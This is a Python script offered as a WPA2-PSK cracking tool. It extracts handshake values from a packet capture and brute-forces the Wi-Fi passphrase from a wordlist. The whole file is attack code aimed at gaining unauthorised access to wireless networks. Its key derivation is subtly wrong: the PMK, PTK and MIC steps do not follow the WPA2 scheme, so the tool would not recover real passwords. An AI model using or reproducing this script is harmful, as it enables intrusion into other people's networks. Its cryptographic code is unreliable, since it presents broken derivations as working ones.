import sys
import hashlib
import hmac
import struct
from scapy.all import *
import argparse
import binascii
from passlib.hash import pbkdf2_sha1

# Extract the MIC, nonces, and SSID from the capture file
def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")
    
    return mic, snonce, anonce, sta_mac, bssid, ssid

# PBKDF2 to derive PMK using passlib
def derive_pmk(password, ssid):
    # Use passlib's pbkdf2_sha1 to derive the key directly without formatting issues
    pmk = pbkdf2_sha1.using(rounds=4096).hash(password + ssid)
    
    # Extract the raw key from the passlib hash (the part after the first "$" symbol)
    raw_pmk = pmk.split('$')[-1]  # The actual raw key part
    # Convert the raw PMK to bytes (by decoding from the base64 representation)
    return binascii.a2b_base64(raw_pmk)

# Generate PTK from PMK
def derive_ptk(pmk, sta_mac, bssid, snonce, anonce):
    # The PTK is derived using PMK, MAC addresses, and nonces
    data = struct.pack("!6s6s32s32s", bssid, sta_mac, snonce, anonce)
    ptk = hmac.new(pmk, data, hashlib.sha1).digest()
    return ptk

# Compute the MIC from PTK and compare it to the captured MIC
def compute_mic(ptk, eapol_data):
    return hmac.new(ptk[:16], eapol_data, hashlib.sha1).digest()[:16]

# Brute-force attack on the WPA-PSK
def crack_psk(capture_file, wordlist_file):
    mic, snonce, anonce, sta_mac, bssid, ssid = extract_mic_and_nonce_and_ssid(capture_file)

    if not mic or not snonce or not anonce:
        print("Missing required elements to proceed with the attack.")
        return

    # Read wordlist for candidate passwords
    with open(wordlist_file, 'r') as f:
        passwords = f.readlines()

    for password in passwords:
        password = password.strip()  # Remove any surrounding whitespace or newline
        print(f"Trying password: {password}")
        
        # Derive PMK using the password and SSID
        pmk = derive_pmk(password, ssid)
        
        # Derive PTK using PMK, MAC addresses, and nonces
        ptk = derive_ptk(pmk, sta_mac, bssid, snonce, anonce)
        
        # Extract the EAPOL data (Message 2 of 4)
        eapol_data = None
        packets = rdpcap(capture_file)
        for packet in packets:
            if packet.haslayer(EAPOL) and packet.getlayer(EAPOL).type == 3:
                eapol_data = bytes(packet.getlayer(EAPOL))
                break
        
        if eapol_data:
            # Compute the MIC using the PTK
            computed_mic = compute_mic(ptk, eapol_data)
            if computed_mic == mic:
                print(f"Password found: {password}")
                break
        else:
            print("No EAPOL data found.")
        
# Argument parser for command-line execution
def main():
    parser = argparse.ArgumentParser(description="WPA2-PSK Cracking Tool")
    parser.add_argument("capture_file", help="Capture file (.cap/.pcap) containing the handshake")
    parser.add_argument("-P", "--wordlist", help="Wordlist file containing possible passwords", required=True)
    
    args = parser.parse_args()

    crack_psk(args.capture_file, args.wordlist)

if __name__ == "__main__":
    main()
